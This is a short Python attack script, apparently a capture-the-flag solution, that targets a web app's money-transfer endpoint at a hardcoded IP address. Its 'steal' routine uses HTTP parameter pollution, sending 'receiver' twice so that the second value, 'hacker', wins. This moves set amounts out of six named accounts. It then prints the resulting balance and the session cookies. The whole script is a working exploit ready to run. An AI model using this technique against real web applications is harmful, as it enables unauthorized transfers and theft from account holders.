import httpx
import re

URL = 'http://129.204.78.34:20805/'


class Builder(object):
    def __init__(self, url):
        self.client = httpx.Client()
        self.url = url
        self.params = []

    def add_param(self, key, value):
        self.params.append((key, value))

    def run(self):
        query = self.url + '?' + '&'.join('='.join(pair) for pair in self.params)
        resp = self.client.get(query)
        self.params.clear()

    def steal(self, target, amount):
        self.add_param('sender', target)
        self.add_param('receiver', 'l1uyun' if target != 'l1uyun' else 'dragon')
        self.add_param('amount', str(amount))
        self.add_param('receiver', 'hacker')
        self.run()

    def check(self):
        resp = self.client.get(self.url)
        print(re.findall(r'你的当前余额是：\d+', resp.text)[0])
        print(re.findall(r'<td>(.+?)</td><td>(.+?)</td>', resp.text))


builder = Builder(URL)

builder.steal('l1uyun', 2300)
builder.steal('eagle', 2430)
builder.steal('tiger', 4250)
builder.steal('dragon', 3570)
builder.steal('phoenix', 2650)
builder.steal('wolf', 2640)

builder.check()

print(builder.client.cookies)
